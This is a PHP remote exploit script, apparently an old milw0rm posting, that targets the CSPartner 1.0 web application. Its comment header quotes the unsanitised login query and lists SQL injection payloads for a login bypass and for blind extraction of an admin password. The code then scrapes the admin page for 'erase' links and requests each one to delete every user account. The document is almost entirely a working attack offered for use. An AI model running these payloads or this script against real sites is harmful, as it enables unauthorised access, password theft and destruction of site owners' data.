<?php

/*

   CSPartner 1.0 (Delete All Users/SQL Injection) Remote Exploit
   ----------------------------------------------------------------
   By StAkeR[at]hotmail[dot]it 
   http://www.easy-script.com/scripts-dl/cspartne-01.zip
   ----------------------------------------------------------------
   
   File gestion.php
   
   5. if(!empty($_POST["pseudo"]) && !empty($_POST["passe"])){
   6. $sql  = "SELECT * FROM $tblPartner where pseudo='".$_POST["pseudo"]."' AND password='".$_POST["passe"]."'";
   7. $resultat = mysql_db_query($mydbPartner, $sql);
   
   Blind SQL Injection or Login ByPass for you :P
   
   Examples: ($_POST['pseudo'] and $_POST['passe'])
   
  -1 ' or '1=1
  -2 ' or ascii(substring((select password from CSPartner where id=1),1,1))=[97]/*
  -3 and other :D
  
   
   
*/


error_reporting(0);

$host = $argv[1] or die("Usage: php [exploit.php] [http://localhost/cms]\n");

if(preg_match_all('/erase=(.+?)"/',file_get_contents($host.'/admin/index.php'),$out))
{
  for($i=0;$i<=count($out);$i++)
  {
    file_get_contents($host.'/admin/index.php?erase='.$out[1][$i]);
  }
    echo "[-] All Users Deleted\n";
}
else
{
  echo "[-] Exploit Failed!\n";
}

# milw0rm.com [2008-10-23]